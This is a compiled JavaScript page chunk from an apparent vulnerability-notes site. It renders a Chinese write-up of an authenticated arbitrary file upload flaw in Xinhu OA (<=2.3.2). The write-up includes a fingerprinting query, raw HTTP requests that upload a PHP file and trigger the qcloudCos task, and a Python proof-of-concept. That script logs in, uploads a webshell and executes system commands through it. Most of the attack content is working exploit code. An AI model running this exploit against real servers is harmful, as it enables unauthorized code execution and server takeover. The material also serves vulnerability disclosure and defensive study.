import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as l,c as o,a as n,b as s,d as e,e as t}from"./app-58e4a7d6.js";const c={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,[s("信呼 OA <=v2.3.2 版本在"),n("code",null,"webmain\\task\\runt\\qcloudCosAction.php"),s("云存储下调用了"),n("code",null,"qcloudCosClassAction"),s("方法，导致文件上传漏洞。通过该漏洞，攻击者可突破上传限制，上传 php 文件获取服务器shell。")],-1),d=n("p",null,"利用前提是已经获取了用户名/登陆口令。",-1),m=n("p",null,"参考链接：",-1),v={href:"https://github.com/rainrocka/xinhu",target:"_blank",rel:"noopener noreferrer"},k=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>信呼OA &lt;= 2.3.2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;信呼协同办公系统&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240124101156480.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>登陆系统，找到上传点：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>任务资源 → 文件传送 → 相关文件
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上传1.php，记录filepath和id：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=769871 HTTP/1.1
Host: www.xinhu2.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type:multipart/form-data; boundary=
---------------------------40605609116060410203660967062
Content-Length: 250
Origin: http://www.xinhu2.com
Connection: close
Referer:http://www.xinhu2.com/index.php?m=upload&amp;d=public&amp;callback=&amp;upkey=20220513091317429617&amp;showid=fileidview
Cookie:deviceid=1650359786139;xinhu_mo_adminid=ye0xhh0xte0lp0yy0xtj0xtb0xtv0yy0xxt0jt0xtb0ye0yx0yp0le03;xinhu_ca_adminuser=admin;xinhu_ca_rempass=0;PHPSESSID=hp2qfqngssh75ij0r8j8kg6f47
-----------------------------40605609116060410203660967062
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;
Content-Type: application/octet-stream

&lt;?php phpinfo(); ?&gt;

-----------------------------40605609116060410203660967062--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查看1.php是否上传成功：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=9 HTTP/1.1
Host: www.xinhu2.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: deviceid=1650359786139; xinhu_mo_adminid=ye0xhh0xte0lp0yy0xtj0xtb0xtv0yy0xxt0jt0xtb0ye0yx0yp0le03; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0; PHPSESSID=hp2qfqngssh75ij0r8j8kg6f47
Upgrade-Insecure-Requests: 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上传后路径：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://&lt;IP&gt;/upload/2024-01/23_16071247.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2>`,16),h={href:"http://poc.py",target:"_blank",rel:"noopener noreferrer"},b=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># 1.php为webshell</span>

<span class="token comment"># 需要修改以下内容：</span>
<span class="token comment"># url_pre = &#39;http://&lt;IP&gt;/&#39;</span>
<span class="token comment"># &#39;adminuser&#39;: &#39;&lt;ADMINUSER_BASE64&gt;&#39;,</span>
<span class="token comment"># &#39;adminpass&#39;: &#39;&lt;ADMINPASS_BASE64&gt;&#39;,</span>

<span class="token keyword">import</span> requests

session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
url_pre <span class="token operator">=</span> <span class="token string">&#39;http://&lt;IP&gt;/&#39;</span>
url1 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">&#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39;</span>
url2 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">&#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39;</span>
<span class="token comment"># url3 = url_pre + &#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;ID&gt;&#39;</span>
data1 <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;rempass&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;0&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;jmpass&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;false&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;device&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;1625884034525&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;ltype&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;0&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;adminuser&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&lt;ADMINUSER_BASE64&gt;&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;adminpass&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&lt;ADMINPASS_BASE64&gt;&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;yanzm&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&#39;</span>    
<span class="token punctuation">}</span>

r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span>
r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;file&#39;</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;1.php&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;r+&#39;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
filepath <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;filepath&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
filepath <span class="token operator">=</span> <span class="token string">&quot;/&quot;</span> <span class="token operator">+</span> filepath<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;.uptemp&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">&#39;.php&#39;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>
<span class="token builtin">id</span> <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;id&#39;</span><span class="token punctuation">]</span>
url3 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">&#39;</span></span>
r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url3<span class="token punctuation">)</span>
r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_pre <span class="token operator">+</span> filepath <span class="token operator">+</span> <span class="token string">&quot;?1=system(&#39;dir&#39;);&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function g(x,_){const a=i("ExternalLinkIcon");return l(),o("div",null,[r,u,d,m,n("ul",null,[n("li",null,[n("a",v,[s("https://github.com/rainrocka/xinhu"),e(a)])])]),k,n("p",null,[n("a",h,[s("poc.py"),e(a)])]),b])}const y=p(c,[["render",g],["__file","信呼OA qcloudCosAction.php 任意文件上传漏洞.html.vue"]]);export{y as default};
